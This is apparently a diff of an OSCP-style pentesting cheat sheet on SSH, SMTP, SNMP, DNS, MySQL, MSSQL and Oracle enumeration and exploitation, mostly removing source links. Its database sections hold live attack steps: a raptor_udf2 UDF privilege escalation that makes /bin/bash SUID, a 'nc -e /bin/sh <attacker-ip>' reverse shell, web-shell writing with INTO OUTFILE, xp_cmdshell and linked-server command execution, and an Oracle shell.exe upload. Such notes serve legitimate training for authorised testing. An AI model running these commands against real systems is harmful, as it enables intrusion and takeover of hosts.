 If `ForwardAgent yes` is set (globally in `/etc/ssh/ssh_config` or per-host) and a legitimate user SSHes into the box you've compromised while their agent is forwarded, their agent socket is briefly usable by anyone who can access it during that session (typically requires matching the connecting user's UID, but root or a misconfigured socket permission can expose it) — letting you authenticate to every host their key is trusted on without ever exfiltrating the private key itself. Always check `$SSH_AUTH_SOCK`/`ssh-add -l` immediately after landing a shell.
-Source: https://en.wikipedia.org/wiki/Ssh-agent ; https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration#ssh-agent-forwarding-abuse
 
 **29c. Pre-auth username enumeration — CVE-2018-15473 (OpenSSH < 7.7)**
 ```
@@ -1144,7 +984,6 @@ git clone https://github.com/Rhynorater/CVE-2018-15473-Exploit
 python3 sshUsernameEnumExploit.py --userList users.txt <ip> [--port 22]
 ```
 Sends a malformed `SSH2_MSG_USERAUTH_REQUEST` (authenticating via a crafted public-key packet) and times the server's response: a valid username causes OpenSSH to check the key against `authorized_keys` before rejecting (slower), an invalid one is rejected immediately (faster) — a pre-auth timing oracle for username discovery against builds before the 7.7 fix. Affects OpenSSH 2.3–7.7 inclusive. nxc's `ssh` module has no built-in equivalent (its flags are limited to `--key-file`/`--sudo-check`/`-x`), so this is a standalone technique.
-Source: https://www.exploit-db.com/exploits/45939, https://github.com/Rhynorater/CVE-2018-15473-Exploit
 
 **30. netexec SSH module (credential/key spraying)**
 ```
@@ -1155,7 +994,6 @@ nxc ssh <ip> -u <user> -p '<pass>' -x "cat /etc/passwd"
 nxc ssh <ip> -u <user> -p '<pass>' --sudo-check
 ```
 `--key-file` tests a recovered private key against a target/user; `-x` runs a one-off command post-auth; `--sudo-check` reports whether the account has any passwordless/sudo rights, a fast privesc triage step.
-Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0
 
 ---
 
@@ -1231,28 +1069,24 @@ SMTP (TCP/25, often also 465/587 for submission) frequently leaks valid mailbox/
 nmap -sV -p25 -sC <target>
 ```
 Grabs the SMTP banner and runs default NSE scripts (includes `smtp-commands`); banner often discloses the mail daemon and version (e.g. Postfix, Exim, hMailServer, Microsoft ESMTP).
-Source: [Nmap Reference Guide](https://nmap.org/book/man.html)
 
 **Manual banner grab with netcat**
 ```
 nc -nv <target> 25
 ```
 Opens a raw TCP connection; server responds with `220 <hostname> ESMTP ...` banner without needing to send anything.
-Source: [SMTP Enumeration (Port 25) — OSCP Notes](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smtp-enumeration-port-25)
 
 **Manual banner grab with telnet**
 ```
 telnet <target> 25
 ```
 Same purpose as netcat; telnet is preferred by some because it echoes typed commands, easier for interactive sessions.
-Source: [Port 25 - SMTP | Pentesting Quick Reference](https://notes.cavementech.com/pentesting-quick-reference/port-25-smtp)
 
 **List supported SMTP verbs (nmap)**
 ```
 nmap -p25 --script smtp-commands <target>
 ```
 Sends `EHLO` and reports the full command list the server advertises (VRFY, EXPN, STARTTLS, AUTH mechanisms, etc.), telling you which enumeration verbs are worth trying.
-Source: [smtp-commands NSE — Nmap Scripting Engine](https://nmap.org/nsedoc/scripts/smtp-commands.html)
 
 **Manual EHLO/HELO handshake (netcat/telnet)**
 ```
@@ -1260,7 +1094,6 @@ nc -nv <target> 25
 HELO test
 ```
 or `EHLO test` for extended SMTP; required as the first command by most servers before other verbs are accepted.
-Source: [SMTP Enumeration — OSCP Notes](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/smtp-enumeration-port-25)
 
 **Manual username enumeration with VRFY**
 ```
@@ -1269,7 +1102,6 @@ VRFY root
 VRFY nonexistentuser1234
 ```
 `250` response = valid user (or ambiguous match), `550`/`551`/`553` = invalid; compare responses between a likely-valid and clearly-invalid username to fingerprint the difference. Many modern MTAs (Postfix default, Exim hardened configs) disable VRFY.
-Source: [Mail server / SMTP Enumeration — hcs0](https://hannahsuarez.github.io/2017/smtp-enumeration/)
 
 **Manual username enumeration with EXPN**
 ```
@@ -1278,7 +1110,6 @@ EXPN root
 EXPN admin
 ```
 EXPN expands a mailing-list/alias name to its member addresses — useful against Sendmail-family servers where it's enabled; often disabled alongside VRFY.
-Source: [Mail server / SMTP Enumeration — hcs0](https://hannahsuarez.github.io/2017/smtp-enumeration/)
 
 **Manual username enumeration with RCPT TO (full transaction)**
 ```
@@ -1288,49 +1119,42 @@ MAIL FROM:<test@test.com>
 RCPT TO:<root@target.com>
 ```
 Works even when VRFY/EXPN are disabled, since the server must validate the recipient during a real delivery attempt; `250`/`550` responses reveal valid vs. invalid mailboxes. This is the most reliable manual technique against hardened Postfix/Exim.
-Source: [Enumerating SMTP Servers with NMAP — Medium](https://medium.com/@minimalist.ascent/enumerating-smtp-servers-with-nmap-2a92c7b2c8de)
 
 **smtp-user-enum — VRFY mode (default)**
 ```
 smtp-user-enum.pl -M VRFY -U users.txt -t <target>
 ```
 Iterates a username wordlist against the target using VRFY (default mode when `-M` omitted); reports each guess as valid/invalid based on the SMTP response code.
-Source: [pentestmonkey/smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) / [README](https://github.com/pentestmonkey/smtp-user-enum/blob/master/README.md)
 
 **smtp-user-enum — EXPN mode, single user**
 ```
 smtp-user-enum.pl -M EXPN -u admin -t <target>
 ```
 Tests a single username via EXPN instead of a wordlist; `-u` for one user vs `-U file` for a list.
-Source: [pentestmonkey/smtp-user-enum README](https://github.com/pentestmonkey/smtp-user-enum/blob/master/README.md)
 
 **smtp-user-enum — RCPT mode with domain suffix**
 ```
 smtp-user-enum.pl -M RCPT -D example.com -U users.txt -t <target>
 ```
 `-M RCPT` enumerates via the `MAIL FROM`/`RCPT TO` transaction (bypasses disabled VRFY/EXPN); `-D` appends the domain to build full email addresses (e.g. `root@example.com`); `-f` can override the MAIL FROM address (default `user@example.com`).
-Source: [pentestmonkey/smtp-user-enum README](https://github.com/pentestmonkey/smtp-user-enum/blob/master/README.md)
 
 **smtp-user-enum against multiple targets**
 ```
 smtp-user-enum.pl -M VRFY -U users.txt -T targets.txt -m 5 -p 25
 ```
 `-T` points to a file of target IPs instead of a single `-t`; `-m` sets max parallel worker processes (default 5); `-p` sets the SMTP port.
-Source: [pentestmonkey/smtp-user-enum README](https://github.com/pentestmonkey/smtp-user-enum/blob/master/README.md)
 
 **Nmap smtp-enum-users NSE script**
 ```
 nmap -p25 --script smtp-enum-users <target>
 ```
 Nmap's built-in equivalent to smtp-user-enum; attempts VRFY, then falls back to EXPN and RCPT TO using its bundled username list (or a custom one via `--script-args smtp-enum-users.methods=RCPT,userdb=<file>`).
-Source: [Enumerating SMTP Servers with NMAP — Medium](https://medium.com/@minimalist.ascent/enumerating-smtp-servers-with-nmap-2a92c7b2c8de)
 
 **Run every SMTP NSE script at once**
 ```
 nmap -p25 --script "smtp*" <target>
 ```
 Convenience sweep covering smtp-commands, smtp-enum-users, smtp-open-relay, smtp-ntlm-info, and the smtp-vuln-* CVE checks in one pass.
-Source: [OSCP Cheat Sheet and Command Reference — Cas van Cooten](https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/)
 
 **Manual open relay test (netcat/telnet)**
 ```
@@ -1345,7 +1169,6 @@ This is an open relay test.
 .
 ```
 If the server accepts a `RCPT TO` for a recipient on a domain the server does NOT itself host, and completes the `DATA`/`.` sequence with a `250` OK, it is functioning as an open relay usable for spoofed mail/phishing pivots.
-Source: [SMTP (Simple Mail Transfer Protocol) Pentesting — Hackviser](https://hackviser.com/tactics/pentesting/services/smtp)
 
 **Nmap open relay test**
 ```
@@ -1356,7 +1179,6 @@ or with explicit args:
 nmap --script smtp-open-relay.nse --script-args smtp-open-relay.domain=example.com -p 25,465,587 <target>
 ```
 Automates the MAIL FROM/RCPT TO relay test using 16 predefined header/envelope combinations and reports which succeed.
-Source: [smtp-open-relay NSE — Nmap Scripting Engine](https://nmap.org/nsedoc/scripts/smtp-open-relay.html)
 
 ---
 
@@ -1373,84 +1195,72 @@ nmap -sU -p161 --open <target>
 nmap -sU -p161 -sV --script snmp-info <target>
 ```
 Confirms UDP/161 is open and, if so, fingerprints the SNMP agent/version via `snmp-info`.
-Source: [Exploring SNMP Servers — Medium](https://medium.com/@minimalist.ascent/exploring-snmp-servers-with-nmap-54eb27dade5f)
 
 **onesixtyone — single host, wordlist brute force**
 ```
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
 ```
 Fires SNMP `GET` requests for `sysDescr` using every string in the wordlist (default 10ms interval — very fast) and reports any string that returns a response, since invalid community strings in v1/v2c simply get no reply.
-Source: [Find SNMP Community String using Onesixtyone — InfosecOne](https://infosecone.com/blog/find-snmp-community-string-using-onesixtyone/) / [Pentesting SNMP — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
 **onesixtyone — explicit port**
 ```
 onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -p 161 <target>
 ```
 Same as above with the port pinned explicitly (useful if SNMP is on a non-default port).
-Source: [SNMP pentesting — Infosec Institute](https://www.infosecinstitute.com/resources/penetration-testing/snmp-pentesting/)
 
 **onesixtyone — multiple targets from a file**
 ```
 onesixtyone -c community.txt -i targets.txt
 ```
 `-i` supplies a file of target IPs so the same wordlist is brute-forced across an entire subnet/host list in one run.
-Source: [htb-Penetration-Testing-Cheat-Sheet — SNMP.md](https://github.com/papaaizar/htb-Penetration-Testing-Cheat-Sheet/blob/master/Enumeration/SNMP/SNMP.md)
 
 **Nmap snmp-brute NSE script**
 ```
 nmap -sU -p161 --script snmp-brute <target>
 ```
 Alternative brute-forcer built into Nmap; uses its default community-string list (or `--script-args snmp-brute.communitiesdb=<file>` for a custom one).
-Source: [snmp-brute NSE — Nmap Scripting Engine](https://nmap.org/nsedoc/scripts/snmp-brute.html)
 
 **Hydra SNMP brute force**
 ```
 hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -t 8 -w 1 -f -v -V <target> snmp
 ```
 General-purpose brute forcer as an alternative to onesixtyone; `-f` stops on first valid string found, `-V` shows every attempt.
-Source: [htb-Penetration-Testing-Cheat-Sheet — SNMP.md](https://github.com/papaaizar/htb-Penetration-Testing-Cheat-Sheet/blob/master/Enumeration/SNMP/SNMP.md)
 
 **snmpwalk — full MIB dump, SNMPv1**
 ```
 snmpwalk -v1 -c public <target>
 ```
 Recursively walks the entire OID tree the community string has access to under SNMPv1, dumping every value the agent exposes — the standard first move once a valid string is found.
-Source: [Enumerating SNMP for Pentesting — Infinite Logins](https://infinitelogins.com/2021/02/21/enumerating-snmp-for-pentesting-udp-ports-161-162/)
 
 **snmpwalk — full MIB dump, SNMPv2c**
 ```
 snmpwalk -v2c -c public <target>
 ```
 Same full dump using SNMPv2c, which most modern devices default to; try both v1 and v2c since a device may only respond to one.
-Source: [Pentesting SNMP — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
 **snmpwalk — targeted OID dump**
 ```
 snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2
 ```
 Walks only the given OID subtree instead of the whole MIB — use this once you know which branch (e.g. running processes) you want without the noise of a full dump.
-Source: [SNMPWALK Examples for Windows and Linux — ITT Systems](https://www.ittsystems.com/snmpwalk-examples/)
 
 **snmp-check — full formatted enumeration**
 ```
 snmp-check <target> -c public
 ```
 Wraps snmpwalk-equivalent queries and pretty-prints them into labeled sections (hostname, uptime, contact, network interfaces, storage, running processes, listening TCP ports, installed software) — faster to read than raw snmpwalk output.
-Source: [snmpcheck — Kali Linux Tools](https://www.kali.org/tools/snmpcheck/) / [SNMP Enumeration — OSCP Notes](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/snmp-enumeraion)
 
 **snmp-check — full option set**
 ```
 snmp-check <target> -p 161 -c public -v 2c -w -t 5 -r 1
 ```
 `-p` port (default 161), `-c` community (default `public`), `-v` SNMP version (1 or 2c, default 1), `-w` also attempts write-access detection, `-t` timeout seconds (default 5), `-r` retry count.
-Source: [SNMP Enumeraion (Port 161) — OSCP Notes](https://gabb4r.gitbook.io/oscp-notes/service-enumeration/snmp-enumeraion)
 
 **Nmap SNMP NSE sweep**
 ```
 nmap -sU -p161 --script "snmp* and not snmp-brute" <target>
 ```
 Runs every SNMP-related NSE script except the brute-forcer (which you'd run separately/more slowly) — covers snmp-sysdescr, snmp-processes, snmp-win32-users, snmp-win32-shares, snmp-interfaces, snmp-netstat, snmp-info in one pass.
-Source: [SNMP.md — TheSnowWight/hackdocs](https://github.com/TheSnowWight/hackdocs/blob/master/pentesting/pentesting-snmp/README.md)
 
 **Metasploit snmp_enum auxiliary module**
 ```
@@ -1460,42 +1270,36 @@ set COMMUNITY public
 run
 ```
 Metasploit's built-in full enumerator — alternative to snmp-check for structured output (hardware, storage, users, processes, network config). **Exam caveat: like all Metasploit modules, this is only usable against the single machine you've designated for Metasploit use on exam day — do not run it against multiple targets; `snmp-check`/`snmpwalk` above are the exam-safe, reusable equivalents.**
-Source: [htb-Penetration-Testing-Cheat-Sheet — SNMP.md](https://github.com/papaaizar/htb-Penetration-Testing-Cheat-Sheet/blob/master/Enumeration/SNMP/SNMP.md)
 
 **Useful OID — system description**
 ```
 snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0
 ```
 `sysDescr` (RFC1213-MIB) — discloses OS name/version, kernel build, or device firmware in one query; fast way to fingerprint the host without a full walk.
-Source: [Pentesting SNMP — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
 **Useful OID — hostname**
 ```
 snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5.0
 ```
 `sysName` — the configured system/host name.
-Source: [Common OIDs Of SNMP — LuLeey](https://www.luleey.com/common-oids-of-snmp/)
 
 **Useful OID — running processes**
 ```
 snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.4.2.1.2
 ```
 `hrSWRunName` (HOST-RESOURCES-MIB) — lists every running process by name; combine with `.1.3.6.1.2.1.25.4.2.1.4` (`hrSWRunPath`) to get executable paths, occasionally revealing credentials passed as CLI arguments (visible to SNMP the same way `ps aux` would show them).
-Source: [SNMP Process OIDs — SNMP Monitoring](https://snmp-monitoring.info/sensors/processes/) / [Enumerating SNMP for Pentesting — Infinite Logins](https://infinitelogins.com/2021/02/21/enumerating-snmp-for-pentesting-udp-ports-161-162/)
 
 **Useful OID — installed software**
 ```
 snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.6.3.1.2
 ```
 `hrSWInstalledName` — enumerates installed software packages/patch level, useful for identifying outdated or vulnerable installed applications on the target.
-Source: [Enumerating SNMP for Pentesting — Infinite Logins](https://infinitelogins.com/2021/02/21/enumerating-snmp-for-pentesting-udp-ports-161-162/)
 
 **Useful OID — storage/mounted filesystems**
 ```
 snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.2.3.1.3
 ```
 `hrStorageDescr` (HOST-RESOURCES-MIB `hrStorageEntry` column 3) — lists disk partitions/mount points; combine with sibling columns `.4`/`.5`/`.6` (`hrStorageAllocationUnits`/`hrStorageSize`/`hrStorageUsed`) for allocation units and size, useful for recon of disk layout before further exploitation.
-Source: [useful SNMP OIDs — Medium](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0); RFC 2790 (HOST-RESOURCES-MIB `hrStorageEntry` SEQUENCE)
 
 **Useful OID — network interfaces / IP addresses**
 ```
@@ -1503,28 +1307,24 @@ snmpwalk -v2c -c public <target> 1.3.6.1.2.1.2.2.1.2
 snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20.1.1
 ```
 `ifDescr` (IF-MIB) lists interface names; `ipAdEntAddr` (IP-MIB) lists bound IPv4 addresses — reveals internal/second NICs and additional subnets not visible from a single external scan.
-Source: [Common OIDs Of SNMP — LuLeey](https://www.luleey.com/common-oids-of-snmp/)
 
 **Useful OID — listening/established TCP connections**
 ```
 snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.1
 ```
 `tcpConnState`/`tcpConnTable` (RFC1213-MIB `tcpConnEntry` column 1; walk `1.3.6.1.2.1.6.13.1` for the whole table) — effectively a remote `netstat`, revealing internal-only listening services not reachable/visible from your scanning position.
-Source: [useful SNMP OIDs — Medium](https://joelzhang.medium.com/useful-snmp-oids-5a6c773ccdd0); RFC 1213 (`tcpConnEntry` SEQUENCE)
 
 **Useful OID — Windows local user accounts (legacy LAN Manager MIB)**
 ```
 snmpwalk -v1 -c public <target> 1.3.6.1.4.1.77.1.2.25
 ```
 On older Windows hosts running the legacy SNMP service with the LAN Manager MIB extension, this OID dumps local Windows user accounts directly — a well-known OSCP/HTB technique for username enumeration without any auth.
-Source: [htb-Penetration-Testing-Cheat-Sheet — SNMP.md](https://github.com/papaaizar/htb-Penetration-Testing-Cheat-Sheet/blob/master/Enumeration/SNMP/SNMP.md)
 
 **snmpbulkwalk — faster full dump for large MIBs**
 ```
 snmpbulkwalk -v2c -c public <target> .
 ```
 Uses `GETBULK` instead of repeated `GETNEXT`, pulling multiple OIDs per request — noticeably faster than `snmpwalk` against devices exposing large MIB trees (e.g. big routers/switches).
-Source: [SNMPWALK Examples for Windows and Linux — ITT Systems](https://www.ittsystems.com/snmpwalk-examples/)
 
 **Edge case — SNMPv3 (no community string, user-based security)**
 SNMPv3 replaces the plaintext community string with per-user authentication (`authNoPriv`/`authPriv`) and optional encryption, so `onesixtyone`/`hydra`-style community brute forcing does not apply — a device with v1/v2c fully disabled (common on hardened routers/exam boxes) still responds to v3 with a valid/guessed username.
@@ -1543,7 +1343,6 @@ snmpwalk -v3 -l authPriv -u admin -a SHA -A <auth_password> -x AES -X <priv_pass
 nmap -sU -p161 --script snmp-info <target>
 ```
 Explanation: try `noAuthNoPriv` first (some devices leak `sysDescr`/engineID to any valid username with no password); if that fails, brute the username against common defaults (`admin`, `public`, vendor defaults) before attempting auth/priv passwords — this is a materially different workflow from v1/v2c and easy to miss if a candidate only rehearses community-string brute forcing.
-Source: [Net-SNMP snmpcmd manpage — SNMPv3 options](http://www.net-snmp.org/docs/man/snmpcmd.html) / [Pentesting SNMP — HackTricks](https://hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
 
 ---
 
@@ -1586,14 +1385,11 @@ Source: [Net-SNMP snmpcmd manpage — SNMPv3 options](http://www.net-snmp.org/do
 
 ---
 
-**Notes for the repo maintainer**: This was compiled via live web research (Aug 2026) rather than from memory alone, cross-checking tool READMEs, Nmap's own NSE docs, and multiple independent OSCP-notes/cheat-sheet sources for command syntax agreement. All commands above are standard, publicly documented enumeration techniques (no exploit code); the SMTP relay test and SNMP write-access flag (`-w`) are the only "active" checks and should only be run against systems you're authorized to test. The Windows LAN-Manager-MIB OIDs (`1.3.6.1.4.1.77.*`) apply only to legacy/NT4-era SNMP agents still occasionally seen on OSCP-style lab boxes — modern Windows Server SNMP feature does not expose this branch by default.
 ---
+
 ## DNS Enumeration
 
-## Topic
-Manual and semi-automated DNS enumeration techniques used during the reconnaissance phase of OSCP-style penetration tests: zone transfer attempts, `dnsrecon`/`dnsenum`/`fierce` usage, subdomain brute forcing, reverse DNS (PTR) lookups, and DNS-based Active Directory domain-controller discovery via SRV records.
-
-## Overview
+### Overview
 DNS is one of the first services enumerated on both external and internal (AD) OSCP-style targets because it is low-noise, unauthenticated, and frequently misconfigured. The workflow typically progresses:
 
 1. Identify authoritative name servers (`NS` records) for the target domain.
@@ -1913,7 +1709,6 @@ mysql -h <target-ip> -P 3306 -u <user> -p<password> <database>
 mysql -h <target-ip> -u <user> --password=<password> -e "SHOW DATABASES;"
 ```
 Connects to the remote instance; the `-e` flag runs a single query non-interactively, useful for scripting enumeration.
-Source: [Route Zero — MySQL Cheat Sheet for Penetration Testers](https://routezero.security/2025/03/29/mysql-cheat-sheet-for-penetration-testers/)
 
 **Core enumeration queries**
 ```sql
@@ -1929,7 +1724,6 @@ SELECT LOAD_FILE('/etc/passwd');
 SELECT 'shell code' INTO OUTFILE '/var/www/html/shell.php';
 ```
 Reveals databases, the running user's actual privileges, hash storage, and the two settings (`secure_file_priv`, `plugin_dir`) that gate file read/write and UDF-based privilege escalation. `LOAD_FILE`/`INTO OUTFILE` require the `FILE` privilege and a `secure_file_priv` value that permits the target path.
-Source: [HackTricks — Pentesting MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql), [DBVis — secure_file_priv](https://www.dbvis.com/thetable/preventing-illicit-uploads-in-mysql-securefilepriv/)
 
 **UDF privilege escalation — compile raptor_udf2**
 ```bash
@@ -1938,7 +1732,6 @@ gcc -g -c raptor_udf2.c -fPIC
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 Compiles the classic `do_system()` UDF shared object as position-independent code required for a `.so` MySQL will load.
-Source: [Exploit-DB 1518 — MySQL UDF Dynamic Library](https://www.exploit-db.com/exploits/1518), [1N3/PrivEsc raptor_udf2.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
 
 **Load the UDF into MySQL and execute commands**
 ```sql
@@ -1950,7 +1743,6 @@ create function do_system returns integer soname 'raptor_udf2.so';
 select do_system('id > /tmp/out; chmod +s /bin/bash');
 ```
 Writes the compiled `.so` from the DB row into the server's `plugin_dir` via `dumpfile`, registers it as a callable SQL function, then invokes arbitrary OS commands as the MySQL service account.
-Source: [Juggernaut Security — MySQL UDF Linux PrivEsc](https://juggernaut-sec.com/mysql-user-defined-functions/), [HackMD — Pentesting the MySQL Service](https://hackmd.io/@tahaafarooq/guide-to-pentest-mysql)
 
 **Alternative UDF library — lib_mysqludf_sys**
 ```sql
@@ -1958,7 +1750,6 @@ CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
 SELECT sys_exec('id > /tmp/out; nc -e /bin/sh <attacker-ip> 4444');
 ```
 `sys_exec`/`sys_eval` from the `lib_mysqludf_sys` project is the payload `sqlmap --os-shell` uploads automatically when it detects `FILE` privileges on MySQL — same net effect as raptor_udf2 but pre-built.
-Source: [mysqludf/lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys), [sqlmap issue #187 — UDF creation](https://github.com/sqlmapproject/sqlmap/issues/187)
 
 **sudo mysql escape / interactive shell escape**
 ```bash
@@ -1967,7 +1758,6 @@ sudo mysql -e '\! /bin/sh'
 mysql> \! /bin/bash
 ```
 If MySQL is runnable via `sudo`, the `\!` meta-command shells out using the client's inherited (root) privileges — no UDF compilation needed.
-Source: [HackTricks — Pentesting MySQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql)
 
 ### Tools table
 | Tool | Purpose |
@@ -1996,7 +1786,6 @@ mssqlclient.py -k -no-pass DOMAIN/<user>@<target-fqdn> -dc-ip <dc-ip>
 mssqlclient.py <user>@<target-ip> -port 1433
 ```
 `-windows-auth` forces NTLM/Windows authentication instead of SQL auth; `-hashes` performs pass-the-hash; `-k -no-pass` uses Kerberos from an existing ccache (`KRB5CCNAME`).
-Source: [Impacket examples/mssqlclient.py (fortra/impacket)](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py), [Hacking Articles — Impacket for Pentester: MSSQL Exploitation](https://www.hackingarticles.in/impacket-for-pentester-mssql-exploitation/)
 
 **Enable and use xp_cmdshell (mssqlclient built-in commands)**
 ```
@@ -2005,7 +1794,6 @@ SQL> xp_cmdshell whoami
 SQL> disable_xp_cmdshell
 ```
 `enable_xp_cmdshell` runs the `sp_configure` toggling internally (see manual form below) and enables direct `xp_cmdshell <command>` execution from the shell prompt.
-Source: [Hacking Articles — MSSQL for Pentester: Command Execution with xp_cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)
 
 **Manually enable xp_cmdshell via raw SQL**
 ```sql
@@ -2016,14 +1804,12 @@ RECONFIGURE;
 EXEC master..xp_cmdshell 'whoami';
 ```
 Required when using a client other than mssqlclient (e.g. sqlcmd, a web-based SQLi) — advanced options must be exposed before `xp_cmdshell` itself can be toggled.
-Source: [thewhiteh4t — MSSQL Pentesting Cheatsheet](https://thewhiteh4t.github.io/blog/mssql-pentesting-cheatsheet/), [PowerUpSQL / HackTricks MSSQL AD Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
 
 **Faster (nxc):** `nxc mssql` auto-enables `xp_cmdshell` and runs a command in one step, skipping the manual `sp_configure`/`enable_xp_cmdshell` dance above:
 ```
 nxc mssql <target-ip> -u <user> -p <pass> -x "whoami"
 nxc mssql <target-ip> -u <user> -p <pass> -X "whoami"        # PowerShell instead of cmd
 ```
-Source: [NetExec-Wiki — mssql-protocol](https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/mssql-protocol)
 
 **Enumerate and use linked servers (mssqlclient built-ins)**
 ```
@@ -2032,7 +1818,6 @@ SQL> use_link [LINKEDSERVERNAME]
 SQL> use_link localhost      -- return to the local server
 ```
 `enum_links` lists configured linked servers; `use_link` pivots subsequent queries/commands to execute in the context of the linked server's mapped login.
-Source: [Hacking Articles — Impacket for Pentester: MSSQL Exploitation](https://www.hackingarticles.in/impacket-for-pentester-mssql-exploitation/)
 
 **Manual linked server enumeration**
 ```sql
@@ -2041,14 +1826,12 @@ EXEC sp_linkedservers;
 SELECT * FROM openquery("linked-server", 'select * from master..sysservers');
 ```
 Reveals every configured link, and (via nested `openquery`) reachable second-hop servers beyond the current instance.
-Source: [HackTricks — Abusing AD MSSQL](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql), [NetSPI — How to Hack Database Links in SQL Server](https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
 
 **Linked server command execution via OPENQUERY**
 ```sql
 SELECT * FROM OPENQUERY("LINKEDSERVER", 'select @@servername; exec master..xp_cmdshell ''whoami''');
 ```
 `OPENQUERY` officially can't run extended procedures directly, but chaining a `SELECT` before `; exec ...` inside the quoted remote batch bypasses that restriction, running `xp_cmdshell` as the linked login.
-Source: [NetSPI — SQL Server Link... Link... Link... and Shell](https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
 
 **Linked server command execution via EXECUTE...AT (multi-hop capable)**
 ```sql
@@ -2058,7 +1841,6 @@ EXECUTE('exec master..xp_cmdshell ''whoami''') AT [LINKEDSERVER];
 EXECUTE('EXECUTE(''exec master..xp_cmdshell ''''whoami'''''') AT [SERVER2]') AT [SERVER1];
 ```
 `EXEC ... AT` sends a full batch to the remote server (unlike `OPENQUERY`, no `SELECT` trick needed) and can be nested to hop across chains of linked servers with trust relationships.
-Source: [dann.rocks — You Are The Weakest Link-ed Server](https://dann.rocks/infrastructure%20hacking/2021/03/28/Attacking-mssql-servers-links/), [HackTricks — Abusing AD MSSQL](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
 
 **Impersonation escalation (EXECUTE AS)**
 ```sql
@@ -2069,16 +1851,13 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 REVERT;
 ```
 If the current login has `IMPERSONATE` rights on a higher-privileged login (commonly `sa`), `EXECUTE AS LOGIN` elevates the session's effective server role to sysadmin without a password; `REVERT` drops back.
-Source: [NetSPI — Hacking SQL Server Stored Procedures: User Impersonation](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/), [HackTricks — Abusing AD MSSQL](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/abusing-ad-mssql)
 
 `mssqlclient.py` built-in shortcut (same SQL_SHELL used for `enum_links`/`use_link` above): `exec_as_login {login}` / `exec_as_user {user}` runs the equivalent `EXECUTE AS LOGIN`/`EXECUTE AS USER` directly from the prompt, e.g. `SQL> exec_as_login sa`.
-Source: [impacket/impacket/examples/mssqlshell.py](https://github.com/fortra/impacket/blob/master/impacket/examples/mssqlshell.py)
 
 **Faster (nxc):** the `mssql_priv` check module enumerates and exploits impersonation-based privesc (including chained `EXECUTE AS`) without hand-writing the SQL above:
 ```
 nxc mssql <target-ip> -u <user> -p <pass> -M mssql_priv
 ```
-Source: [NetExec-Wiki — mssql-protocol modules](https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/mssql-protocol)
 
 ### Tools table
 | Tool | Purpose |
@@ -2104,7 +1883,6 @@ python3 odat.py sidguesser -s <target-ip> -p 1521
 odat sidguesser -s <target-ip> -d <SID> --sids-file=./sids.txt
 ```
 Brute-forces valid Oracle System Identifiers against the TNS listener when the SID is unknown; `--sids-file` supplies a custom wordlist instead of the built-in one.
-Source: [ODAT Wiki — sidguesser](https://github.com/quentinhardy/odat/wiki/sidguesser)
 
 **Credential guessing**
 ```bash
@@ -2112,7 +1890,6 @@ python3 odat.py passwordguesser -s <target-ip> -d <SID>
 odat passwordguesser -s <target-ip> -p 1521 --accounts-files accounts/logins.txt accounts/pwds.txt
 ```
 Tries built-in default Oracle account/password pairs (`scott/tiger`, `system/manager`, etc.) or a custom login/password file combination against the discovered SID.
-Source: [ODAT Wiki — passwordguesser](https://github.com/quentinhardy/odat/wiki/passwordguesser)
 
 **Run every module against found/known credentials**
 ```bash
@@ -2120,35 +1897,30 @@ odat all -s <target-ip> -p 1521 --sids-max-size=3 --sid-charset='abc'
 odat all -s <target-ip> -p 1521 -d <SID> -U <user> -P <password>
 ```
 The `all` module chains SID guessing, password guessing, and every exploitation module in sequence — the fastest way to fully triage an unknown Oracle target.
-Source: [ODAT Wiki — all module](https://github.com/quentinhardy/odat/wiki/all)
 
 **File upload / RCE via UTL_FILE**
 ```bash
 odat utlfile -s <target-ip> -d <SID> -U <user> -P <password> --sysdba --putFile 'C:/windows/temp/' shell.exe /local/path/shell.exe
 ```
